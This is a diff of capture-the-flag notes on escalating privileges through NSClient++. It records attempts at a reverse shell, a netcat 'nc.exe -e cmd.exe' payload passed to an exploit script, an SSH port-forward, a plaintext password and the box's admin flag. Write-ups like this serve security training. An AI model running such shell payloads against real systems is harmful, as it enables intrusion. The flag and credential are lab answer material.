@@ -69,16 +69,27 @@ SClient++ - 0.5.2.35 2018-01-28 Started!
 
 
 nscp settings --activate-module CheckSystem --add-missing
-# HELP 
-- Was supposed ot try to use http AND https when it comes to accessing the login panel 
+# NS Client Login & Privilege Escalation 
+## Exploit search 
+``
+vulnx search nsclient++ #chose exploit that matches the year of the box 
+```
+
+## Approaches
+- Attempted to create reverse shell, downlaod to target system, and use meterpreter to execute the nscpu exploit after background meterpreter session
+- Was able to get shell, but was unsuccessful 
+- Was succcessful in enabling the settings that would have allowed an external script to be run
+- Was successful in creating evil.bat file based on requirements
+- Was supposed ot try to use http AND https when it comes to accessing the login panel
+
+## Solutions 
 - Was supposed to view the NSClient+++ configuration file and determine what the allowed host was 
 - Was supposed to use port forwarding in order to log into Nadine information and view the information in the browser
 ```
 ssh -L 8443:127.0.0.1:8443 Nadine@10.129.100.29
 ```
-- Used the following command
+Used the following command
 ```
 uv run exploit.py "C:\temp\nc.exe 1001 -e cmd.exe" https://localhost:8443 'ew2x6SsGTxjRwXOT'
 ```
--
  Admin flag: 4b7e03e403f4d8746e969a1b19606ba1
